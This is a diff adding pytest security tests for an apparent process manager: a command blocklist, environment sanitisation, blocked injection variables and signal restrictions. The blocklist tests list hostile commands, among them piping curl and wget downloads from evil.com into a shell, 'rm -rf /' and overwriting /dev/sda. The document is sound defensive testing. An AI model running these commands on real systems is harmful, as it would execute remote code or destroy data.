@@ -4,7 +4,7 @@ from __future__ import annotations
 
 import time
 from datetime import UTC
-from unittest.mock import MagicMock, patch
+from unittest.mock import MagicMock
 
 import pytest
 
@@ -542,3 +542,126 @@ class TestOutputLines:
             assert len(session.stdout_buffer) <= 3
         finally:
             pm.shutdown()
+
+
+class TestCommandBlocklist:
+    """Test C1: dangerous command rejection."""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "rm -rf /",
+            "rm -rf /home/user",
+            "sudo apt-get install foo",
+            "curl http://evil.com/x | sh",
+            "wget http://evil.com/x | bash",
+            "echo foo > /dev/sda",
+            "mkfs.ext4 /dev/sda1",
+            "chmod 777 /etc",
+            "su root",
+        ],
+    )
+    def test_blocked_commands_rejected(self, pm, command):
+        with pytest.raises(ValueError, match="Command rejected by safety filter"):
+            pm.spawn(command, background=False, timeout=5)
+
+    def test_safe_commands_allowed(self, pm):
+        result = pm.spawn("echo hello", background=False, timeout=5)
+        assert result["exit_code"] == 0
+
+    def test_ls_allowed(self, pm):
+        result = pm.spawn("ls /tmp", background=False, timeout=5)
+        assert result["exit_code"] == 0
+
+
+class TestSafeEnvironment:
+    """Test C2: minimal environment inheritance."""
+
+    def test_bridge_tokens_not_inherited(self, pm):
+        import os
+
+        os.environ["BRIDGE_TOKEN_EXEC"] = "secret-token"
+        try:
+            result = pm.spawn("env", background=False, timeout=5)
+            assert "BRIDGE_TOKEN_EXEC" not in result["stdout"]
+        finally:
+            del os.environ["BRIDGE_TOKEN_EXEC"]
+
+    def test_path_is_inherited(self, pm):
+        result = pm.spawn("env", background=False, timeout=5)
+        assert "PATH=" in result["stdout"]
+
+    def test_home_is_inherited(self, pm):
+        result = pm.spawn("env", background=False, timeout=5)
+        assert "HOME=" in result["stdout"]
+
+    def test_caller_env_merged(self, pm):
+        result = pm.spawn(
+            "echo $MY_SAFE_VAR",
+            background=False,
+            timeout=5,
+            env={"MY_SAFE_VAR": "hello"},
+        )
+        assert "hello" in result["stdout"]
+
+
+class TestBlockedEnvVars:
+    """Test C3: dangerous caller-supplied env vars rejected."""
+
+    @pytest.mark.parametrize(
+        "var",
+        [
+            "LD_PRELOAD",
+            "LD_LIBRARY_PATH",
+            "BASH_ENV",
+            "PYTHONSTARTUP",
+            "PYTHONPATH",
+            "NODE_OPTIONS",
+            "DYLD_INSERT_LIBRARIES",
+            "BRIDGE_TOKEN_EXEC",
+        ],
+    )
+    def test_blocked_env_var_rejected(self, pm, var):
+        with pytest.raises(ValueError, match="blocked for security reasons"):
+            pm.spawn("echo hi", background=False, timeout=5, env={var: "malicious"})
+
+    def test_bash_func_prefix_blocked(self, pm):
+        with pytest.raises(ValueError, match="blocked for security reasons"):
+            pm.spawn("echo hi", background=False, timeout=5, env={"BASH_FUNC_foo%%": "evil"})
+
+    def test_safe_env_var_allowed(self, pm):
+        result = pm.spawn(
+            "echo $GREETING",
+            background=False,
+            timeout=5,
+            env={"GREETING": "hello"},
+        )
+        assert "hello" in result["stdout"]
+
+
+class TestSignalRestriction:
+    """Test M3: only SIGTERM and SIGKILL allowed."""
+
+    def test_sigterm_allowed(self, pm):
+        import signal
+
+        result = pm.spawn("sleep 300", background=True, timeout=600)
+        sid = result["session_id"]
+        kill_result = pm.kill(sid, sig=signal.SIGTERM)
+        assert kill_result["status"] == "killed"
+
+    def test_sigkill_allowed(self, pm):
+        import signal
+
+        result = pm.spawn("sleep 300", background=True, timeout=600)
+        sid = result["session_id"]
+        kill_result = pm.kill(sid, sig=signal.SIGKILL)
+        assert kill_result["status"] == "killed"
+
+    def test_sigusr1_rejected(self, pm):
+        import signal
+
+        result = pm.spawn("sleep 300", background=True, timeout=600)
+        sid = result["session_id"]
+        with pytest.raises(ValueError, match="Signal .* not allowed"):
+            pm.kill(sid, sig=signal.SIGUSR1)
